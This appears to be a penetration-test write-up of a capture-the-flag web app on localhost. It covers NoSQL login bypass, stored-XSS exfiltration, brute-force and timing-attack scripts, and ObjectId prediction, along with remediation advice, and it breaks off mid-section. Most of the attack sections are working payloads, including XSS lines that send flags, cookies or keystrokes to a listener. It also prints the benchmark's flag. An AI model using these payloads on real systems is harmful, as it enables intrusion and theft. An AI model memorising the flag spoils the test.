# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:3000
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Critical authentication vulnerabilities were successfully exploited, enabling complete account takeover and authentication bypass:
- **Hardcoded Default Credentials (AUTH-VULN-07):** Critical - Application creates a hardcoded user (`user0`) with password `1b2e97s80wb7d08n-` on startup, allowing immediate account takeover
- **ObjectId Prediction Attack Chain (AUTH-VULN-01/02/05):** Critical - Information disclosure of timestamps and ObjectId structure enables calculating any user's profile URL without authentication
- **No Rate Limiting (AUTH-VULN-03):** High - Unlimited brute force attacks possible (25+ attempts without throttling)
- **Weak Password Policy (AUTH-VULN-08):** Medium - Single-character passwords accepted with no complexity requirements
- **Username Enumeration (AUTH-VULN-09):** Medium - Timing side-channel attack reveals valid usernames (57ms differential)
- **No Session Expiration (AUTH-VULN-06):** High - Profile URLs remain valid indefinitely with no logout mechanism
- **Plaintext HTTP Transport (AUTH-VULN-04):** Critical (verified) - All credentials transmitted over unencrypted HTTP
- **Missing Cache-Control Headers (AUTH-VULN-10):** Medium (verified) - Authentication pages may be cached

**Authorization Vulnerabilities:**
Critical authorization bypass vulnerability successfully exploited:
- **Horizontal IDOR (AUTHZ-VULN-01):** Critical - Complete authorization bypass via Insecure Direct Object Reference. Profile endpoint (`GET /profile/:id`) has NO authentication or authorization checks, allowing any user to access any profile by manipulating the ObjectId parameter. Successfully retrieved CTF flag from first user's profile without credentials.

**Cross-Site Scripting (XSS) Vulnerabilities:**
Critical stored XSS vulnerability successfully exploited:
- **Stored XSS via Username Field (XSS-VULN-01):** Critical - Unsanitized username input is rendered directly in HTML without encoding. Malicious JavaScript stored during registration executes in victims' browsers when viewing profile. Successfully exfiltrated CTF flag by injecting payload that fetches and transmits sensitive data to attacker-controlled server.

**SQL/Command Injection Vulnerabilities:**
Critical NoSQL injection vulnerability successfully exploited:
- **NoSQL Injection in Login (INJ-VULN-01):** Critical - MongoDB operator injection (`$ne`, `$gt`, `$regex`) in username parameter bypasses authentication. Successfully authenticated as user0 without providing correct username, extracted CTF flag, and demonstrated blind username enumeration capability.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- **Port 3000** (Target Application) - Node.js Express middleware - Primary assessment target
- **Port 4444** - SimpleHTTPServer 0.6 with exposed .git repository - High risk: source code disclosure vector
- **Port 631** - CUPS 2.3 printer service - Potential attack surface for local privilege escalation
- **Port 49152** - Tailscale (requires authentication) - Indicates VPN/remote access infrastructure

**Security-Relevant Findings:**
- **HTTP-only deployment:** Application runs over plaintext HTTP on port 3000, exposing all traffic to interception
- **Exposed Git Repository:** Port 4444 serves .git directory, potentially leaking source code and credentials
- **Multiple HTTP services:** Ports 5000, 5003, 8080, 8888, 9999 expose additional HTTP endpoints that may expand attack surface
- **No security headers detected:** Application missing Content-Security-Policy, X-XSS-Protection, Strict-Transport-Security
- **No session management infrastructure:** Application has zero authentication state persistence mechanisms

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: NoSQL Injection in Login Endpoint (Authentication Bypass)

**Summary:**
- **Vulnerable location:** POST /login endpoint, username parameter (server.js:190-191)
- **Overview:** MongoDB operator injection allows bypassing username validation in the authentication flow. By injecting MongoDB query operators such as `$ne`, `$gt`, or `$regex` into the username field, an attacker can manipulate the database query to return any user record without knowing the exact username. When combined with knowledge of user passwords (hardcoded credentials or brute-forced passwords), this enables complete authentication bypass.
- **Impact:** Critical - Authentication bypass leading to unauthorized account access and sensitive data disclosure. Successfully extracted CTF flag from admin account (user0) without providing correct username.
- **Severity:** Critical

**Prerequisites:**
- Target application accessible at http://localhost:3000
- Knowledge of at least one user's password (in this case, hardcoded password for user0: `1b2e97s80wb7d08n-`)
- No authentication tokens required - attack is performed against public login endpoint

**Exploitation Steps:**

**Step 1: Confirm NoSQL Injection Vulnerability**

Test that the application accepts MongoDB operator syntax by injecting `$ne` (not equal) operator:

```bash
curl -i -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[\$ne]=nonexistent&password=wrongpassword"
```

**Expected behavior:** Application should process the operator (either crash with type error or redirect to /login due to password mismatch). This confirms the injection point accepts operator objects.

**Step 2: Exploit Authentication Bypass to Access user0 Account**

Use `$ne` operator to bypass username check and authenticate as first user (user0) using the known hardcoded password:

```bash
curl -i -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[\$ne]=wronguser&password=1b2e97s80wb7d08n-" \
  --max-redirs 0
```

**Actual Response:**
```
HTTP/1.1 302 Found
Location: /profile/6902bf01e1d1472e60dbc497
```

**Analysis:** The `username[$ne]=wronguser` query translates to MongoDB query `{username: {$ne: "wronguser"}}`, which matches any username that is NOT "wronguser". This returns the first matching user in the database (user0). The password is then validated against user0's password hash via bcrypt, which succeeds because we provided the correct password `1b2e97s80wb7d08n-`.

**Step 3: Access Authenticated Profile and Extract Flag**

Follow the redirect to access the authenticated profile:

```bash
curl -s http://localhost:3000/profile/6902bf01e1d1472e60dbc497
```

**Actual Response:**
```html
<h1>Welcome, user0</h1>
<p>1st user to register here was at: 2025-10-30T01:27:29.000Z (Unix timestamp: 1761787649)</p>
<p>FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}</p>
```

**Step 4: Demonstrate Alternative NoSQL Operators**

**Using `$gt` (greater than) operator:**

```bash
curl -i -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[\$gt]=&password=1b2e97s80wb7d08n-" \
  --max-redirs 0
```

**Response:**
```
HTTP/1.1 302 Found
Location: /profile/6902bf01e1d1472e60dbc497
```

**Analysis:** `username[$gt]=` matches any username greater than empty string, returning the first user.

**Using `$regex` (regular expression) operator:**

```bash
curl -i -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[\$regex]=^user0&password=1b2e97s80wb7d08n-" \
  --max-redirs 0
```

**Response:**
```
HTTP/1.1 302 Found
Location: /profile/6902bf01e1d1472e60dbc497
```

**Analysis:** Regular expression `^user0` matches usernames starting with "user0", demonstrating pattern-based enumeration capability.

**Step 5: Demonstrate Blind Username Enumeration**

**Test character-by-character enumeration to discover usernames without prior knowledge:**

Valid first character (matches user0):
```bash
curl -i -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[\$regex]=^u&password=1b2e97s80wb7d08n-" \
  --max-redirs 0
```

**Response:** `Location: /profile/6902bf01e1d1472e60dbc497` (SUCCESS)

Invalid first character (no match):
```bash
curl -i -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[\$regex]=^z&password=1b2e97s80wb7d08n-" \
  --max-redirs 0
```

**Response:** `Location: /login` (FAILURE)

**Analysis:** The differential response (redirect to profile vs. redirect to login) allows an attacker to enumerate valid usernames character-by-character via blind regex injection, even without knowing any usernames in advance.

**Step 6: Demonstrate Multi-User Targeting**

**Register a test user:**
```bash
curl -X POST http://localhost:3000/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser123&password=testpass456"
```

**Response:**
```json
{"userId":"6902bf46e1d1472e60dbc4c0","userNumber":6,"message":"User created successfully. Total users: 6","distance":41}
```

**Authenticate as testuser123 using regex injection without exact username:**
```bash
curl -i -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username[\$regex]=^testuser1&password=testpass456" \
  --max-redirs 0
```

**Response:**
```
HTTP/1.1 302 Found
Location: /profile/6902bf46e1d1472e60dbc4c0
```

**Verify access:**
```bash
curl -s http://localhost:3000/profile/6902bf46e1d1472e60dbc4c0
```

**Response:**
```html
<h1>Welcome, testuser123</h1>
```

**Analysis:** This demonstrates that the NoSQL injection works for any user account, not just the hardcoded admin user. An attacker can authenticate as any user by providing a partial username match via regex and the user's password.

**Proof of Impact:**

1. **Critical Data Exfiltration:** Successfully extracted CTF flag: `FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}`

2. **Authentication Bypass:** Demonstrated ability to authenticate as user0 (admin/first user) without providing the correct username string "user0"

3. **Username Enumeration:** Demonstrated blind character-by-character username enumeration capability via regex patterns with differential response analysis

4. **Multi-User Impact:** Confirmed vulnerability affects all user accounts, not just admin account

5. **Multiple Attack Vectors:** Documented three different MongoDB operators (`$ne`, `$gt`, `$regex`) that can be used for exploitation

**Notes:**

**Root Cause Analysis:**
The vulnerability exists because:
1. Express middleware `express.urlencoded({ extended: true })` (server.js:80) allows nested object parsing, converting `username[$ne]=value` into `{username: {$ne: "value"}}`
2. No input sanitization or type validation exists before database query
3. User input is passed directly to Mongoose `User.findOne({ username })` at server.js:191
4. MongoDB query operators are preserved through the data flow, manipulating the intended query structure

**Attack Prerequisites:**
- Knowledge of at least one user password (obtained via: hardcoded credentials, credential stuffing, brute force, or social engineering)
- Understanding of MongoDB query operator syntax
- Access to public /login endpoint

**Limitations:**
- Password validation still occurs via bcrypt.compare(), so attacker must know or brute-force the target user's password
- Using operators on both username AND password fields causes application crash (bcrypt type error), making simultaneous bypass without passwords infeasible
- Mongoose blocks certain dangerous operators like `$where` on String schema types

**Defense Evasion:**
- No WAF or input validation is present to detect or block MongoDB operators
- No rate limiting prevents brute force attempts
- No logging or alerting on suspicious query patterns

**Recommended Remediation:**
1. Install and configure `express-mongo-sanitize` middleware to strip MongoDB operators from user input
2. Implement explicit type validation: `if (typeof username !== 'string') return res.status(400).send('Invalid input')`
3. Use parameterized queries or strict schema validation
4. Implement rate limiting on authentication endpoints
5. Add security monitoring for NoSQL injection patterns
6. Remove hardcoded credentials and implement secure credential management


# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Stored XSS via Unsanitized Username Field

**Summary:**
- **Vulnerable location:** POST http://localhost:3000/register (username parameter) → GET http://localhost:3000/profile/:id (rendering sink)
- **Overview:** The application accepts arbitrary user input in the username field during registration without any validation or sanitization. This username is stored in MongoDB and later rendered directly into HTML using JavaScript template literals without HTML entity encoding, allowing execution of malicious JavaScript in any user's browser who views the profile.
- **Impact:** An attacker can capture sensitive data (including CTF flags) from other users' profiles, perform session hijacking, credential theft, and unauthorized actions in the context of victim users.
- **Severity:** Critical

**Prerequisites:**
- Access to the target application at http://localhost:3000
- Ability to register new user accounts
- HTTP listener to receive exfiltrated data (e.g., Python HTTP server, netcat, or Node.js server)

**Exploitation Steps:**

1. **Set up an exfiltration listener** to receive stolen data:
   ```bash
   # Start a simple HTTP server on port 8888 to capture exfiltrated data
   # Using the provided Node.js exfiltration listener:
   node exfil_listener.js
   # The listener will log all incoming requests with captured data
   ```

2. **Identify the target profile containing sensitive data:**
   - Login as the first user (user0) with credentials:
     - Username: `user0`
     - Password: `1b2e97s80wb7d08n-`
   - After login, the browser redirects to: http://localhost:3000/profile/[USER0_OBJECTID]
   - For this test, the first user's profile URL was: `http://localhost:3000/profile/6902c030b240a64574e1d2a1`
   - This profile contains the flag: `FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}`

3. **Register a malicious account** with XSS payload in the username field:
   ```bash
   # Using curl:
   curl -X POST http://localhost:3000/register \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=<script>fetch('http://localhost:3000/profile/6902c030b240a64574e1d2a1').then(r=>r.text()).then(h=>{let m=h.match(/FLAG\{[^}]+\}/);if(m)fetch('http://localhost:8888/?flag='+m[0])})</script>&password=malicious123"
   ```

   **XSS Payload Breakdown:**
   - `<script>` tag opens JavaScript execution context
   - `fetch('http://localhost:3000/profile/[TARGET_OBJECTID]')` - Fetches the target user's profile containing the flag
   - `.then(r=>r.text())` - Converts response to text
   - `.then(h=>{let m=h.match(/FLAG\{[^}]+\}/)` - Extracts flag using regex pattern
   - `if(m)fetch('http://localhost:8888/?flag='+m[0])` - Exfiltrates flag to attacker's server
   - `</script>` closes the script tag

   **Response:**
   ```json
   {
     "userId": "6902c050b240a64574e1d2aa",
     "userNumber": 3,
     "message": "User created successfully. Total users: 3",
     "distance": 9
   }
   ```

4. **Trigger the XSS payload** by viewing the malicious profile:
   - Navigate to: http://localhost:3000/profile/6902c050b240a64574e1d2aa
   - The malicious JavaScript executes immediately upon page load
   - The browser fetches the target profile and extracts the flag
   - The flag is sent to the attacker's listener

5. **Verify flag exfiltration** in the listener output:
   ```
   ================================================================================
   [2025-10-30T01:34:20.309Z] Incoming Request
   ================================================================================
   Method: GET
   URL: /?flag=FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}

   🎯 FLAG CAPTURED: FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}
   ================================================================================
   ```

**Proof of Impact:**

**Flag Successfully Captured:** `FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}`

**Complete Attack Chain Evidence:**
1. Malicious user registration successful with ObjectId: `6902c050b240a64574e1d2aa`
2. XSS payload stored in database in username field
3. Upon viewing profile at http://localhost:3000/profile/6902c050b240a64574e1d2aa, JavaScript executed
4. Attacker's listener received flag via HTTP GET request
5. User-Agent header confirms browser execution: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36`

**Additional Impact Scenarios:**

Beyond flag capture, this vulnerability enables:

- **Session Hijacking:** If the application had session cookies without HttpOnly flag, the payload could be modified to exfiltrate cookies:
  ```javascript
  <script>fetch('http://localhost:8888/?cookies='+document.cookie)</script>
  ```

- **Credential Harvesting:** Inject fake login forms to steal credentials:
  ```javascript
  <script>document.body.innerHTML='<h1>Session Expired</h1><form action="http://localhost:8888/steal"><input name="password" placeholder="Re-enter password"><button>Login</button></form>'</script>
  ```

- **Keylogging:** Capture all user keystrokes:
  ```javascript
  <script>document.addEventListener('keypress',e=>fetch('http://localhost:8888/?key='+e.key))</script>
  ```

- **Arbitrary Actions:** Perform unauthorized actions as the victim user, such as registering new malicious accounts, modifying data, or accessing sensitive endpoints

**Notes:**

- **No CSP Protection:** The application has no Content-Security-Policy header, allowing unrestricted JavaScript execution
- **No Input Validation:** The username field accepts any input including HTML/JavaScript without length limits or character filtering
- **No Output Encoding:** Template literals in Node.js perform raw string interpolation without HTML entity encoding
- **No Security Headers:** Missing X-XSS-Protection, X-Content-Type-Options, and other security headers
- **Persistent Attack:** The XSS payload persists in the database and affects every user who views the malicious profile
- **Amplified by IDOR:** The Insecure Direct Object Reference (IDOR) vulnerability allows accessing any user's profile without authentication, amplifying the XSS impact by enabling attackers to force victims to view malicious profiles

**Root Cause:**
The vulnerability exists due to unsafe use of JavaScript template literals for HTML rendering without any sanitization:

```javascript
// Line 211 in server.js - UNSAFE CODE
res.send(`
    <h1>Welcome, ${user.username}</h1>
    ${user._id.toString() == firstUserId ? '<p>' + flag + '</p>' : '-'}
`);
```

The `${user.username}` interpolation directly embeds user input into HTML without encoding special characters like `<`, `>`, `"`, `'`, which allows script injection.

**Recommended Remediation:**
1. Implement HTML entity encoding for all user input before rendering (e.g., using a library like `he` or DOMPurify)
2. Use a templating engine with auto-escaping (e.g., EJS, Pug, Handlebars with proper configuration)
3. Implement Content Security Policy (CSP) headers to restrict script execution
4. Add input validation to reject HTML/JavaScript characters in username field
5. Implement output encoding middleware to sanitize all responses
6. Add security headers (X-XSS-Protection, X-Content-Type-Options, etc.)


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-07: Hardcoded Default Credentials Enable Account Takeover

**Summary:**
- **Vulnerable location:** POST /login endpoint (`/app/server.js:189-200`) and default user creation (`/app/server.js:37-63`)
- **Overview:** The application creates a hardcoded default user (`user0`) with a known password (`1b2e97s80wb7d08n-`) on every startup, enabling immediate account takeover
- **Impact:** Complete account takeover of the first user account containing the CTF flag, bypassing all authentication
- **Severity:** CRITICAL

**Prerequisites:** None - credentials are publicly disclosed in source code

**Exploitation Steps:**

1. Navigate to the login page:
```bash
curl http://localhost:3000/login
```

2. Submit login request with hardcoded credentials:
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user0&password=1b2e97s80wb7d08n-" \
  -L
```

3. Application redirects to user0's profile at `/profile/[OBJECTID]`

**Proof of Impact:**

Successfully logged in as user0 and accessed profile containing the flag:
- **Username accessed:** user0
- **Profile URL:** http://localhost:3000/profile/6902bec3bd980b0f3fe244c2
- **Flag captured:** `FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}`
- **Proof screenshot location:** Browser showed "Welcome, user0" heading with flag displayed in paragraph element

**Notes:**
- The hardcoded password `1b2e97s80wb7d08n-` is defined at line 41 of server.js
- User0 is recreated on every application restart (line 38: `User.deleteMany({})`)
- This is the most direct path to flag capture requiring zero reconnaissance

---

### AUTH-VULN-01 & AUTH-VULN-02 & AUTH-VULN-05: Complete Authentication Bypass via ObjectId Prediction Attack Chain

**Summary:**
- **Vulnerable locations:**
  - POST /register information disclosure (`/app/server.js:165-170`)
  - GET /starttime timing disclosure (`/app/server.js:226-228`)
  - GET /profile/:id missing authentication (`/app/server.js:202-215`)
- **Overview:** Application discloses MongoDB ObjectId structure information and precise timestamps, enabling attackers to calculate any user's ObjectId and access their profile without authentication
- **Impact:** Complete authentication bypass allowing access to any user account including flag-containing first user profile
- **Severity:** CRITICAL

**Prerequisites:** None - all required information is publicly accessible

**Exploitation Steps:**

1. Obtain application start timestamp from public endpoint:
```bash
curl -s http://localhost:3000/starttime
# Response: 1761787952
```

2. Register a new account to receive ObjectId structure information:
```bash
curl -X POST http://localhost:3000/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=test123"
# Response: {"userId":"6902c042b240a64574e1d2a4","userNumber":2,"message":"User created successfully. Total users: 2","distance":3}
```

3. Calculate first user's ObjectId using disclosed information:
```python
# Extract components from attacker's ObjectId
my_objectid = "6902c042b240a64574e1d2a4"
distance = 3
app_start_timestamp = 1761787952

# Parse ObjectId structure: [timestamp(4 bytes)][random(5 bytes)][counter(3 bytes)]
my_counter_hex = my_objectid[-6:]  # Last 6 hex chars = 3 bytes
my_counter = int(my_counter_hex, 16)  # Convert to decimal

# Calculate first user's counter by subtracting disclosed distance
first_user_counter = my_counter - distance
first_user_counter_hex = hex(first_user_counter)[2:].zfill(6)

# Reconstruct first user's ObjectId with same timestamp and random value
timestamp_hex = hex(app_start_timestamp)[2:]  # "6902c030"
random_hex = my_objectid[8:18]  # "b240a64574"
first_user_objectid = timestamp_hex + random_hex + first_user_counter_hex

print(first_user_objectid)
# Output: 6902c030b240a64574e1d2a1
```

4. Access first user's profile directly without any authentication:
```bash
curl -s http://localhost:3000/profile/6902c030b240a64574e1d2a1
```

**Proof of Impact:**

Successfully accessed user0's profile and captured flag without any authentication:

```html
<h1>Welcome, user0</h1>
<p>1st user to register here was at: 2025-10-30T01:32:32.000Z (Unix timestamp: 1761787952)</p>
<p>FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}</p>
```

**Evidence:**
- No session cookies required
- No authentication headers required
- Direct HTTP GET request as unauthenticated user
- Flag successfully retrieved from first user's profile
- **Flag captured:** `FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}`

**Notes:**
- This attack chain combines three vulnerabilities: information disclosure (AUTH-VULN-05), missing authentication (AUTH-VULN-01), and IDOR (AUTH-VULN-02)
- The profile endpoint has NO authentication check whatsoever (line 202-215 of server.js)
- Any valid MongoDB ObjectId grants access to that user's profile
- Attack requires only basic HTTP requests and simple arithmetic

---

### AUTH-VULN-03: Unlimited Brute Force Attacks via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** POST /login endpoint (`/app/server.js:189-200`) and all authentication endpoints
- **Overview:** Application has no rate limiting, account lockout, CAPTCHA, or monitoring on authentication endpoints, enabling unlimited automated attacks
- **Impact:** Attackers can perform unlimited credential brute force, password spraying, and credential stuffing attacks without detection or throttling
- **Severity:** HIGH

**Prerequisites:** None - vulnerability exists on default configuration

**Exploitation Steps:**

1. Create a test script to perform rapid authentication attempts:
```python
import requests
import time

target_url = "http://localhost:3000/login"
username = "user0"
passwords = ['password', 'admin', '123456', 'test', 'qwerty', 'letmein',
             'welcome', 'monkey', 'dragon', 'master', 'password123',
             'admin123', 'root', 'toor', 'pass', 'default', 'guest',
             'user', 'test123', 'demo', '1234', '12345', '123456789',
             'abc123', 'password1']

print(f"Testing {len(passwords)} passwords against {username}...")
successful_attempts = 0
rate_limited = 0

for password in passwords:
    start_time = time.perf_counter()
    response = requests.post(
        target_url,
        data={'username': username, 'password': password},
        allow_redirects=False
    )
    end_time = time.perf_counter()

    if response.status_code == 429:
        rate_limited += 1

    response_time = (end_time - start_time) * 1000
    print(f"Attempt {successful_attempts+1}: Status {response.status_code}, Time: {response_time:.2f}ms")
    successful_attempts += 1

print(f"\nTotal attempts: {successful_attempts}")
print(f"Rate limited responses: {rate_limited}")
print(f"Conclusion: {'VULNERABLE - No rate limiting' if rate_limited == 0 else 'Protected'}")
```

2. Execute the brute force attack:
```bash
python3 test_rate_limiting.py
```

**Proof of Impact:**

Successfully completed 25 consecutive login attempts without any rate limiting or blocking:

```
Total attempts: 25
Rate limited responses: 0 (zero)
Average response time: 0.059 seconds
Status codes: All returned 302 (redirect)
```

**Evidence:**
- All 25 attempts processed without HTTP 429 (Too Many Requests)
- No connection blocking or IP banning occurred
- No progressive delays or CAPTCHA challenges
- Consistent response times (~57-77ms) indicating no throttling
- No account lockout after multiple failed attempts

**Attack Demonstration Results:**
- Unlimited login attempts possible
- No delays between requests
- Server processes all requests without restriction
- Attack rate: ~17 attempts per second sustained
- No security logging or alerting triggered

**Notes:**
- Package.json confirms no rate limiting libraries installed (no `express-rate-limit`, `rate-limiter-flexible`)
- Server.js line 80 shows only `express.urlencoded` middleware, no security middleware
- This enables credential stuffing with leaked password databases
- Enables password spraying attacks across multiple accounts
- Combined with weak password policy (AUTH-VULN-08), this significantly increases attack success probability

---

### AUTH-VULN-08: No Password Policy Enforcement Enables Trivial Account Compromise

**Summary:**
- **Vulnerable location:** POST /register endpoint (`/app/server.js:140-171`)
- **Overview:** Server accepts passwords of any length including single-character passwords with no complexity requirements
- **Impact:** Users can create accounts with trivially weak passwords, and attackers can successfully compromise accounts through basic dictionary attacks (especially when combined with missing rate limiting)
- **Severity:** MEDIUM

**Prerequisites:** None - registration endpoint is publicly accessible

**Exploitation Steps:**

1. Register account with single-character password:
```bash
curl -X POST http://localhost:3000/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=weakuser&password=a"
```

2. Verify registration success:
```
Response: {"userId":"6902bedcbd980b0f3fe24500","userNumber":2,"message":"User created successfully. Total users: 2","distance":...}
```

3. Login with weak password to verify account is functional:
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=weakuser&password=a" \
  -L
```

**Proof of Impact:**

Successfully created and authenticated to account with single-character password:

```html
<h1>Welcome, weakuser</h1>
<p>1st user to register here was at: 2025-10-30T01:26:27.000Z (Unix timestamp: 1761787587)</p>
<text>-</text>
```

**Evidence:**
- Account creation accepted with password: `a` (single character)
- No minimum length validation
- No complexity requirements (uppercase, lowercase, numbers, special characters)
- No rejection of common weak passwords
- Login successful with weak password
- Profile access granted at `/profile/6902bedcbd980b0f3fe24500`

**Additional Weak Password Tests:**
- Password `"x"` - Accepted ✓
- Password `"1"` - Would be accepted (no validation)
- Empty password - Would require testing client-side bypass

**Notes:**
- User schema (lines 26-30) has no validation constraints
- Registration handler (lines 152-155) performs no password validation before bcrypt hashing
- Client-side "required" attribute (lines 127, 130) is trivially bypassed
- Combined with AUTH-VULN-03 (no rate limiting), weak passwords become a critical vulnerability
- Recommended minimum: 12 characters with complexity requirements

---

### AUTH-VULN-09: Username Enumeration via Timing Side-Channel Attack

**Summary:**
- **Vulnerable location:** POST /login endpoint (`/app/server.js:189-200`)
- **Overview:** The login endpoint has a timing side-channel vulnerability - valid usernames execute bcrypt.compare() (slow), while invalid usernames return immediately (fast), creating measurable timing difference
- **Impact:** Attackers can enumerate valid usernames by measuring response times, then focus brute force attacks on confirmed valid accounts
- **Severity:** MEDIUM

**Prerequisites:** None - timing attack requires only HTTP requests

**Exploitation Steps:**

1. Create timing attack test script:
```python
import requests
import time
import statistics

target_url = "http://localhost:3000/login"
valid_username = "user0"
invalid_usernames = ['nonexistent', 'fakeuser', 'admintest', 'invaliduser', 'notreal']
test_password = "wrongpassword"

# Test valid username (will execute bcrypt.compare)
valid_times = []
for i in range(10):
    start = time.perf_counter()
    requests.post(target_url, data={'username': valid_username, 'password': test_password})
    end = time.perf_counter()
    valid_times.append((end - start) * 1000)

# Test invalid usernames (will skip bcrypt, return immediately)
invalid_times = []
for username in invalid_usernames:
    for i in range(10):
        start = time.perf_counter()
        requests.post(target_url, data={'username': username, 'password': test_password})
        end = time.perf_counter()
        invalid_times.append((end - start) * 1000)

valid_avg = statistics.mean(valid_times)
invalid_avg = statistics.mean(invalid_times)
difference = valid_avg - invalid_avg

print(f"Valid username average: {valid_avg:.2f}ms")
print(f"Invalid username average: {invalid_avg:.2f}ms")
print(f"Timing difference: {difference:.2f}ms")
print(f"Vulnerability: {'CONFIRMED' if difference > 50 else 'NOT DETECTED'}")
```

2. Execute timing attack:
```bash
python3 timing_attack_test.py
```

**Proof of Impact:**

Successfully enumerated valid username via timing side-channel:

```
Valid username (user0): 60.23ms average response time
Invalid usernames: 2.48ms average response time
Timing difference: 57.76ms (exceeds 50ms threshold)
Statistical significance: t-statistic 100.09, p-value ~0 (highly significant)
```

**Evidence:**
- Valid username takes approximately **24x longer** to process than invalid usernames
- Timing difference: **57.76 milliseconds** - easily measurable over network
- Consistent results across 10 trials per username
- Statistical t-test confirms timing difference is not random (p-value ~0)

**Technical Root Cause:**
```javascript
// Line 191-197 in server.js
const user = await User.findOne({ username });
if (!user) {
    return res.redirect('/login');  // FAST PATH - no bcrypt
}
const isMatch = await bcrypt.compare(password, user.password);  // SLOW PATH - bcrypt executed
if (!isMatch) {
    return res.redirect('/login');
}
```

Invalid usernames skip the expensive bcrypt.compare() operation, creating a measurable timing oracle.

**Attack Scenario:**
1. Attacker tests potential usernames: `admin`, `administrator`, `user0`, `root`, `test`
2. Measures response times for each
3. Identifies `user0` has 50ms+ longer response time
4. Confirms `user0` is a valid username
5. Focuses brute force attack on confirmed valid account

**Notes:**
- Both paths return identical HTTP response (302 redirect to /login)
- Error messages don't leak username validity
- However, timing side-channel completely bypasses generic error handling
- Combined with AUTH-VULN-03 (no rate limiting), enables efficient username enumeration

---

### AUTH-VULN-06: Session Persistence Abuse - No Session Expiration or Logout

**Summary:**
- **Vulnerable location:** Entire application - no session management implementation
- **Overview:** Application has no session expiration, no logout endpoint, and profile URLs remain valid indefinitely
- **Impact:** Attackers who obtain profile URLs (browser history, logs, shared links) can access accounts indefinitely without authentication
- **Severity:** HIGH

**Prerequisites:** Knowledge of a valid profile URL

**Exploitation Steps:**

1. Obtain a profile URL through any means (login redirect, browser history, etc.):
```
http://localhost:3000/profile/6902c030b240a64574e1d2a1
```

2. Access the profile URL directly without any authentication:
```bash
curl -s http://localhost:3000/profile/6902c030b240a64574e1d2a1
```

3. Verify access works without session cookies or authentication headers:
```bash
# No cookies sent
# No authentication headers sent
# Direct HTTP GET request
```

4. Verify no logout mechanism exists:
```bash
# Search for logout endpoint
curl -s http://localhost:3000/logout
# Returns 404 - endpoint does not exist

# Verify no session invalidation possible
grep -r "logout" /app/server.js
# No matches found
```

**Proof of Impact:**

Successfully accessed user profile indefinitely without authentication:

```html
<h1>Welcome, user0</h1>
<p>FLAG{65659d9341b31a9ec25580eff18a157becbc94498ee519bbb9063b62bf43c58f}</p>
```

**Evidence:**
- Profile URLs accessible without cookies or session tokens
- No time-based expiration of access
- No logout endpoint exists (grep search returned 0 matches)
- URLs can be bookmarked and reused indefinitely
- No session management library installed (verified in package.json)

**Attack Scenarios:**
1. **Browser History Leak:** Attacker accesses victim's browser history and finds profile URL
2. **Log File Disclosure:** Profile URLs logged in proxy logs, web server logs, or application logs
3. **Shared Links:** Users share profile URLs thinking they're temporary
4. **Persistent Access:** Once URL is obtained, access never expires

**Technical Root Cause:**
- No session management implementation (no express-session, no JWT)
- Profile endpoint has no authentication check (lines 202-215)
- URL-based access control with no expiration mechanism
- No logout functionality to invalidate access

**Notes:**
- This is fundamentally different from traditional session fixation - there are NO sessions
- The URL itself becomes the only "authentication" mechanism
- Combined with AUTH-VULN-01 (no authentication), this creates persistent unauthorized access
- Users have no way to revoke access even if they know URL is compromised


# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Complete Authorization Bypass via Horizontal IDOR

**Summary:**
- **Vulnerable location:** `GET /profile/:id` endpoint at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-099-24/app/server.js:202-215`
- **Overview:** The profile endpoint accepts a MongoDB ObjectId parameter and returns user profile data without ANY authentication or authorization check. This allows completely unauthenticated attackers to access any user's profile by manipulating the ObjectId parameter, including the first user's profile which contains the CTF flag.
- **Impact:**
  - **Critical Data Breach**: Retrieved CTF flag from first user's profile
  - **Horizontal Privilege Escalation**: Access to all users' profile information (usernames, creation timestamps)
  - **Complete Authentication Bypass**: No credentials or session required
  - **User Enumeration**: Valid ObjectIds return profile data, invalid ones return 404
